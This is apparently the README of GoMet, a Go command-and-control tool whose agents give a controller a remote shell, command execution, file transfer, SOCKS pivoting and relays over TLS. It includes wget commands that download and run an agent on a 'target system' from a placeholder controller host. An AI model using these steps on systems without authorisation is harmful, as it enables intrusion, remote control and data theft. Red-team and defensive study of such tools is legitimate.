GoMet
=====

Simple multi-platform agent and its controller. 
The agent communicates with its controller through TLS tunnel.

#### Work in progress :)

Build
-----
Install Go (https://golang.org/dl/).

Clone repository
```
git clone git@github.com:mimah/GoMet.git
```

And compile GoMet.

```
cd GoMet
go build ./...
```

Basic usage
-----------

Launch GoMet

```
#> ./GoMet

server > info
Local listener: 0.0.0.0:8888
Socks listener: 127.0.0.1:9050
HTTP magic: khRoKbh3AZSHbix
server >
server > help

Commands:
  clear         clear the screen
  exit          Exit
  generate      Generate an agent
  help          display help
  info          Print server information
  routes        List routes
  sessions      List sessions
```

On the target system download an agent for the corresponding OS and Architecture

```
wget https://<controller>:8888/khRoKbh3AZSHbix/agent/darwin/amd64 --no-check-certificate -O agent
````

The controller automatically builds an agent with the right information.

**Note**: 
"khRoKbh3AZSHbix" is a random magic generated by the controller, type "info" in the GoMet CLI to know it.
In this use-case you have to add --no-check-certificate option because the default TLS certificate is auto-signed.

**Available OS** (see Golang GOOS): 

    linux
    darwin
    windows
    solaris
    ...
    
**Available Architectures** (see Golang GOARCH):

    386
    amd64
    arm
    arm64
    ...

Launch the agent
```
chmod +x agent
./agent
```

In GoMet CLI we can see the new session created
```
server > New session 1 - <agent_hostname> - <agent_IP>:<agent_port> - darwin/amd64
```

Interact with a session
------------------------

```
server > sessions open 1
session 1 > help

Commands:
  cat           Print a file
  clear         clear the screen
  close         Close session
  connect       Connect a local port to a remote Address
  download      Download a file
  execute       Execute a command
  exit          Back to server
  getuid        Get user Id
  help          display help
  jobs          List jobs
  listen        Connect a remote port to a local Address
  ls            List files
  netstat       List connections
  ps            List processes
  pwd           Get current directory
  relay         Relay listen
  shell         Interactive remote shell
  streams       List streams
  upload        Upload a file


session 1 >
```

TCP forwarding
--------------
We can forward TCP connection through the agent TLS tunnel in both direction.

##### connect 
Listen a port locally (on the controller system) and forward it to a remote service.

##### listen
Listen a port remotely (on the agent system) and forward it to a local service.


Socks5 and routing
-----------------
We can enable a Socks5 listener on the controller to access remote networks through the agents and define routes toward the different sessions.


Make a relay
------------
If the controller is not accessible from the target system (after network pivot) we can define a "relay" on another agent.
Then we can access the controller through the relay like the controller itself.

```
session 1 > relay
Remote Address: 0.0.0.0:9999
session 1 >
```

And from the target system

```
wget https://<relay>:9999/khRoKbh3AZSHbix/agent/darwin/amd64 --no-check-certificate -O agent
````

Share files with the controller
---------------------------------
The controller can share files. 

Copy a file in the share directory and download it with the magic URL 
```
wget https://<controller>:8888/khRoKbh3AZSHbix/my_file --no-check-certificate
```

We can also upload a file to the controller
```
wget https://<controller>:8888/khRoKbh3AZSHbix/other_file --no-check-certificate --post-file file
```

Generate an agent with the CLI
------------------------------
```
server > generate
OS: windows
Arch: amd64
Host: <controller>:8888
HTTP proxy:
HTTPS proxy:
Proxy username:
Proxy password:
Generated agent URL: https://<controller>:8888/Ye8o14kw1rpMJ8f/ySUxt7YT8X5fyat
server >
```

Configuration files
-------------------
Default configuration is defined in **config/config.json** file.
```
{
  "listenAddr":"0.0.0.0:8888",

  "socks": {
    "enable": true,
    "addr": "127.0.0.1:9050"
  },

  "api": {
    "enable": false,
    "addr": "127.0.0.1:9000"
  }
}
```

Define a tunnel
---------------
If we want to listen through a tunnel we can define it in the configuration file. SSH only actually.
```
{
  "listenAddr":"0.0.0.0:8888",

  "socks": {
    "enable": true,
    "addr": "127.0.0.1:9050"
  },

  "tunnel": {
    "listenAddr":"<exit_node>:8888",
    "nodes": [
      {
        "type":"ssh",
        "host": "<first_node>:22",
        "username": "user",
        "password": "user"
      },
      {
        "type":"ssh",
        "host": "<second_node>:22",
        "username": "user",
        "password": "user"
      },
      {
        "type":"ssh",
        "host": "<exit_node>:22",
        "username": "user",
        "password": "user"
      }
    ]
  }
}
```

Custom TLS certificate
----------------------
A default certificate is generated in the config directory. You can replace it with yours.

**Warning:** If you change the certificate you have rebuild all the agents because the certificate hash will not be the same.
